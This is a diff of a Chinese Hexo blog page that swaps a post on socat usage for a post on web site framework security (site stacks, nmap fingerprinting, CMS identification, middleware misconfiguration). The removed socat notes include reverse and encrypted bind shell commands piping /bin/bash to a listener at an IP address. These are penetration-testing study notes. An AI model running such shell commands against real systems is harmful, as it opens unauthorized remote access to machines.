@@ -5,17 +5,17 @@
   
 
   
-  <title>Socat使用 | Hexo</title>
+  <title>Web网站框架安全 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="建立监听器socat -d -d tcp4-listen:port stdout                                     --&gt; nc -lvvp 建立连接socat - tcp4:ip:port                                                                         --&gt; nc">
+  <meta name="description" content="基础知识：【网站搭建】     由操作系统、web源码、中间件、数据库四大部分组成     ASP+Access     php+mysql     aspx+mssql     jsp+mssql,oracle     python+mongodb下载phpstudy(同样还有宝塔，wmap，Inmap)，一体化集合php+mysql+apache&#x2F;nginx&#x2F;iis，模拟搭建网站【操作系统】1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Socat使用">
-<meta property="og:url" content="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:title" content="Web网站框架安全">
+<meta property="og:url" content="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="建立监听器socat -d -d tcp4-listen:port stdout                                     --&gt; nc -lvvp 建立连接socat - tcp4:ip:port                                                                         --&gt; nc">
+<meta property="og:description" content="基础知识：【网站搭建】     由操作系统、web源码、中间件、数据库四大部分组成     ASP+Access     php+mysql     aspx+mssql     jsp+mssql,oracle     python+mongodb下载phpstudy(同样还有宝塔，wmap，Inmap)，一体化集合php+mysql+apache&#x2F;nginx&#x2F;iis，模拟搭建网站【操作系统】1">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-07-16T07:44:39.000Z">
-<meta property="article:modified_time" content="2021-07-16T07:46:43.135Z">
+<meta property="article:published_time" content="2021-09-12T14:44:46.000Z">
+<meta property="article:modified_time" content="2021-09-12T14:45:38.380Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-Socat使用" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-Web网站框架安全" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time datetime="2021-07-16T07:44:39.000Z" itemprop="datePublished">2021-07-16</time>
+    <a href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" class="article-date">
+  <time datetime="2021-09-12T14:44:46.000Z" itemprop="datePublished">2021-09-12</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Socat使用
+      Web网站框架安全
     </h1>
   
 
@@ -88,33 +88,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h5 id="建立监听器"><a href="#建立监听器" class="headerlink" title="建立监听器"></a>建立监听器</h5><p>socat -d -d tcp4-listen:port stdout                                     <code>--&gt; nc -lvvp</code></p>
-<h5 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h5><p>socat - tcp4:ip:port                                                                    <code>     --&gt; nc ip port</code></p>
-<h5 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h5><p>接收:</p>
-<p>socat tcp4:ip:port file:filename,create</p>
-<p>传输:</p>
-<p>socat tcp4-listen:4444,fork file:filename</p>
-<p><code>fork创建子进程,可以建立多个连接</code></p>
-<p><strong>可以双向传输</strong></p>
-<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>反向:</p>
-<p>socat -d -d tcp4-listen:4444 stdout            建立监听</p>
-<p>socat tcp4:192.168.1.135:4444 exec:/bin/bash            反弹shell</p>
-<p>正向:</p>
-<p>加密传输</p>
-<p><strong>生成公钥和私钥</strong></p>
-<p>openssl req -newkey rsa:2048 -nodes -keyout <code>bind.key</code> -x509 -days <code>365</code> -out <code>bind.crt</code>    </p>
-<p><strong>把公钥和私钥转化为socat传输的格式</strong></p>
-<p>cat bind.key bind.crt &gt; bind.pem            </p>
-<p><strong>建立监听,并反弹shell</strong></p>
-<p>socat openssl-listen:port,verify=0,cert=xxx.pem,fork exec:/bin/bash</p>
-<p><strong>建立连接</strong></p>
-<p>socat - openssl:ip:port,verify=0</p>
-<p><code>!!!:verify=0 --&gt; 禁用ssl</code></p>
+        <p>基础知识：<br>【网站搭建】<br>     由操作系统、web源码、中间件、数据库四大部分组成<br>     ASP+Access<br>     php+mysql<br>     aspx+mssql<br>     jsp+mssql,oracle<br>     python+mongodb<br>下载phpstudy(同样还有宝塔，wmap，Inmap)，一体化集合php+mysql+apache/nginx/iis，模拟搭建网站<br>【操作系统】<br>1、Windows   大小写不敏感<br>2、Linux(70%)   大小写敏感<br>nmap -O [IP或域名]<br>【web源码】<br>1、CMS：开源的网站内容管理系统   开放[开源]：能下载到的   内部：见不到，找不到<br>     关于源码获取的相关途径：搜索(国内dedecms、74cms、phpcms等  国外：WordPress)，咸鱼淘宝(花钱买)，第三方源码站<br>2、脚本类型：asp、aspx、php、jsp、python等<br>     不同网站源码采用不同脚本类型去编写，脚本类型选择上不同造成安全漏洞不同，某些语言能造成的安全漏洞也不一样<br>3、目录结构：后台目录模板目录、数据库目录、数据库配置文件等<br>4、网站系统的应用分类：商城（逻辑漏洞）、论坛（上传漏洞）、博客、第三方(查IP、查域名)（命令执行漏洞）、其他<br>      网站功能决定漏洞类型<br>5、框架<br>【中间件常见安全问题与防护】<br>1、配置导致安全问题<br>      IP 或域名解析目录对应下的存在的安全问题<br>      域名访问，IP访问<br>      脚本后缀解析<br>2、安全配置防护<br>      常见防护中的IP域名验证</p>
+<p>C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322\aspnet_isapi.dll  asp<br>C:\WINDOWS\system32\inetsrv\asp.dll   axd</p>
+<p>查看md5值命令：certutil -hashfile C:\Users\kayven\Desktop\none.gif md5<br>【演示实验】<br>    域名解析目录与IP解析目录安全<br>    文件后缀解析设置    中国菜刀<br>    常见安全测试中的安全防护<br>    WEB 后门与用户及文件权限<br>    CMS识别(人工、在线工具、平台)<br>【涉及资源】<br><a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a><br><a target="_blank" rel="noopener" href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev/</a>    雨苁<a target="_blank" rel="noopener" href="http://www.ddosi.com/">www.ddosi.com</a><br><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a>     在线cms识别</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckthbyhci0005dovj5kkt1s0g" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckthbyhcn0007dovjermxgdo0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -123,19 +104,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          MSF基础
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">信息搜集</div>
+      <div class="article-nav-title">网站数据包结构分析</div>
     </a>
   
 </nav>
